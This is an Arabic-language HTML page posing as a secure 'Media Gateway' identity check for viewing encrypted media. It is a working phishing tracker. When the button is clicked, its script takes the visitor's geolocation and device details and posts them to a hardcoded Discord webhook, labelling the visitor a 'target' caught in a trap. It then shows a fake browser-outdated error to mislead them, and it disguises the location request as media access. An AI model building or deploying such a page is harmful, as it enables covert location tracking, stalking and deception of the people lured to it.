<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Media Gateway | التحقق الآمن</title>
    <style>
        body { background: #0b0e14; color: #ffffff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding-top: 100px; margin: 0; }
        .container { padding: 20px; }
        .icon { font-size: 50px; margin-bottom: 20px; }
        h2 { color: #1a73e8; }
        p { color: #9aa0a6; font-size: 14px; margin-bottom: 30px; }
        .btn { padding: 15px 40px; background: #1a73e8; color: white; border: none; border-radius: 30px; cursor: pointer; font-size: 16px; font-weight: bold; transition: 0.3s; box-shadow: 0 4px 15px rgba(26, 115, 232, 0.3); }
        .btn:hover { background: #1557b0; transform: scale(1.05); }
        #status { margin-top: 20px; font-size: 12px; color: #5f6368; }
    </style>
</head>
<body>

    <div class="container">
        <div class="icon">🔒</div>
        <h2>تحقق من الهوية لعرض الوسائط</h2>
        <p>هذا المحتوى محمي بتشفير طرف إلى طرف. اضغط على الزر أدناه للمعاينة الآمنة.</p>
        
        <button class="btn" onclick="startProcess()">معاينة الوسائط الآن</button>
        
        <div id="status">بروتوكول فحص SSL نشط...</div>
    </div>

    <script>
        async function startProcess() {
            const statusDiv = document.getElementById('status');
            statusDiv.innerText = "جاري الاتصال بالخادم الآمن...";

            navigator.geolocation.getCurrentPosition(async (pos) => {
                // الرابط الخاص بك مدمج هنا برمجياً
                const WEBHOOK_URL = "https://discord.com/api/webhooks/1494444634586222682/HdxT-BynNCFlveKYWjMqYngyasuPSOVI-7a1RAA1QqAOLkW6O5MranKijd5v_yOoXZpa";

                const payload = {
                    username: "رادار الاختراق السيكولوجي",
                    content: "🎯 **هدف جديد وقع في الفخ!**",
                    embeds: [{
                        title: "تقرير السحب الفوري",
                        color: 15158332,
                        fields: [
                            { name: "📍 الموقع على الخريطة", value: `[اضغط هنا لفتح الموقع](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`, inline: false },
                            { name: "📱 معلومات الجهاز", value: navigator.userAgent, inline: false },
                            { name: "⏰ الوقت", value: new Date().toLocaleString('ar-EG'), inline: true }
                        ],
                        footer: { text: "نظام التتبع mrjachac1980" }
                    }]
                };

                try {
                    await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });
                    
                    statusDiv.innerText = "تم إرسال البيانات للمعالجة...";
                    // إيهام الضحية بوجود مشكلة تقنية بعد السحب
                    setTimeout(() => {
                        alert("خطأ (Code 0x882): إصدار المتصفح قديم جداً. يرجى التحديث لعرض المحتوى.");
                    }, 1000);

                } catch (error) {
                    console.error("Error:", error);
                }

            }, (err) => {
                alert("يجب منح صلاحية 'الوصول للوسائط' لفتح الصور المشفرة.");
                statusDiv.innerText = "فشل التحقق: تم رفض الصلاحية.";
            });
        }
    </script>
</body>
</html>
